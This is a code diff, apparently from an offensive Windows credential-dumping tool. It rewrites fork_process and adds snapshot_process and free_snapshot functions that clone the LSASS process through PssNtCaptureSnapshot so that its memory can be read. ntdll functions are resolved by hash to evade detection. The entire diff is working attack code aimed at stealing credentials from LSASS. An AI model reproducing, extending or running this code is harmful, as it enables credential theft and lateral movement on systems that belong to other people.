@@ -467,28 +467,11 @@ HANDLE duplicate_lsass_handle(
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
-    DWORD dwPid,
     HANDLE hProcess
 )
 {
-    // this function can be call with a PID or an existing handle
-    if (!dwPid && !hProcess)
+    if (!hProcess)
         return NULL;
-
-    if (dwPid && !hProcess)
-    {
-        // called with a PID, open handle to LSASS with PROCESS_CREATE_PROCESS
-        hProcess = get_process_handle(
-            dwPid,
-            LSASS_FORK_PERMISSIONS,
-            FALSE
-        );
-        if (!hProcess)
-        {
-            DPRINT_ERR("Could not fork " LSASS);
-            return NULL;
-        }
-    }
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
@@ -528,6 +511,136 @@ HANDLE fork_process(
 
     NtClose(hProcess); hProcess = NULL;
     return hCloneProcess;
+}
+
+// create a snapshot of the LSASS process
+HANDLE snapshot_process(
+    HANDLE hProcess,
+    PHANDLE hSnapshot
+)
+{
+    PssNtCaptureSnapshot_t PssNtCaptureSnapshot;
+    PssNtQuerySnapshot_t   PssNtQuerySnapshot;
+    HANDLE                 hCloneProcess = NULL;
+    DWORD                  process_flags;
+    DWORD                  thread_flags;
+    DWORD                  error_code;
+
+    if (!hProcess)
+        return NULL;
+
+    // find the address of PssNtCaptureSnapshot dynamically
+    PssNtCaptureSnapshot = (PssNtCaptureSnapshot_t)(ULONG_PTR)get_function_address(
+        get_library_address(NTDLL_DLL, TRUE),
+        PssNtCaptureSnapshot_SW2_HASH,
+        0
+    );
+    if (!PssNtCaptureSnapshot)
+    {
+        DPRINT_ERR("Address of 'PssNtCaptureSnapshot' not found");
+        return NULL;
+    }
+    DPRINT(
+        "Got address of PssNtCaptureSnapshot: 0x%p",
+        (PVOID)PssNtCaptureSnapshot
+    );
+
+    *hSnapshot    = NULL;
+    process_flags = PROCESS_PPSCAPTURESNAPSHOT_PERMISSIONS;
+    thread_flags  = THREAD_PPSCAPTURESNAPSHOT_PERMISSIONS;
+
+    error_code = PssNtCaptureSnapshot(
+        hSnapshot,
+        hProcess,
+        process_flags,
+        thread_flags
+    );
+
+    NtClose(hProcess); hProcess = NULL;
+
+    if (error_code != ERROR_SUCCESS)
+    {
+        DPRINT_ERR("Could not create a snapshot of " LSASS ", error: 0x%lx", error_code);
+        return NULL;
+    }
+    DPRINT(
+        "Created a snapshot of the " LSASS " process, snapshot handle: 0x%lx",
+        (DWORD)(ULONG_PTR)*hSnapshot
+    );
+
+    // find the address of PssNtQuerySnapshot dynamically
+    PssNtQuerySnapshot = (PssNtQuerySnapshot_t)(ULONG_PTR)get_function_address(
+        get_library_address(NTDLL_DLL, TRUE),
+        PssNtQuerySnapshot_SW2_HASH,
+        0
+    );
+    if (!PssNtQuerySnapshot)
+    {
+        DPRINT_ERR("Address of 'PssNtQuerySnapshot' not found");
+        return NULL;
+    }
+    DPRINT(
+        "Got address of PssNtQuerySnapshot: 0x%p",
+        (PVOID)PssNtQuerySnapshot
+    );
+
+    error_code = PssNtQuerySnapshot(
+        *hSnapshot,
+        PSS_QUERY_VA_CLONE_INFORMATION,
+        &hCloneProcess,
+        sizeof(PVOID)
+    );
+    if (error_code != ERROR_SUCCESS)
+    {
+        DPRINT_ERR("Could not query the snapshot of " LSASS ", error: 0x%lx", error_code);
+        return NULL;
+    }
+    DPRINT(
+        "Got a handle to the snapshot process: 0x%lx",
+        (DWORD)(ULONG_PTR)hCloneProcess
+    );
+
+    return hCloneProcess;
+}
+
+// frees a snapshot of the LSASS process
+BOOL free_snapshot(
+    HANDLE hSnapshot
+)
+{
+    PssNtFreeSnapshot_t PssNtFreeSnapshot;
+    DWORD               error_code;
+
+    if (!hSnapshot)
+        return TRUE;
+
+    PssNtFreeSnapshot = (PssNtFreeSnapshot_t)(ULONG_PTR)get_function_address(
+        get_library_address(NTDLL_DLL, TRUE),
+        PssNtFreeSnapshot_SW2_HASH,
+        0
+    );
+    if (!PssNtFreeSnapshot)
+    {
+        DPRINT_ERR("Address of 'PssNtFreeSnapshot' not found");
+        return FALSE;
+    }
+    DPRINT(
+        "Got address of PssNtFreeSnapshot: 0x%p",
+        (PVOID)PssNtFreeSnapshot
+    );
+
+    error_code = PssNtFreeSnapshot(hSnapshot);
+
+    NtClose(hSnapshot); hSnapshot = NULL;
+
+    if (error_code != ERROR_SUCCESS)
+    {
+        DPRINT_ERR("Could not free the snapshot of " LSASS ", error: 0x%lx", error_code);
+        return FALSE;
+    }
+    DPRINT("The snapshot has been freed");
+
+    return TRUE;
 }
 
 #endif
